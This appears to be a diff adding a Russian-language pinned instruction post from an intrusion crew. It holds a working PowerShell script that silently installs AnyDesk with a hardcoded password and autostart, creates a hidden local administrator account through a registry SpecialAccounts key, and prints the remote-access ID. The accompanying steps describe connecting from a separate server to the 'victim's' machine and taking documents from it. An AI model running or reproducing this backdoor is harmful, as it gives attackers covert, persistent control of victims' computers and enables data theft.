@@ -1,0 +1,41 @@
+Закреп AnyDesk  - ознакомиться всем
+ Function AnyDesk {
+
+    mkdir "C:\ProgramData\AnyDesk"
+    # Download AnyDesk
+    $clnt = new-object System.Net.WebClient
+    $url = "http://download.anydesk.com/AnyDesk.exe"
+    $file = "C:\ProgramData\AnyDesk.exe"
+    $clnt.DownloadFile($url,$file)
+
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+
+
+    cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+
+
+    net user oldadministrator "qc69t4B#Z0kE3" /add
+    net localgroup Administrators oldadministrator /ADD
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+
+    }
+
+    AnyDesk
+
+
+Выполняем код в Powershell ISE Run As Admin
+На выходе получаем ID
+Сохраняем его к себе
+На отдельном дедике\впс\виртуалке скачиваем Anydesk указываем ID
+Жмем Console Account
+Вводим пароль
+Цитировать
+
+    J9kzQ2Y0qO
+
+И далее авторизываемся локальным админом либо доменной учеткой и пользуемся прелестями Anydesk
+Также можно скачать\загрузить на\с машину жертвы что бывает удобно в осмотре и поиске документации точечно.
+
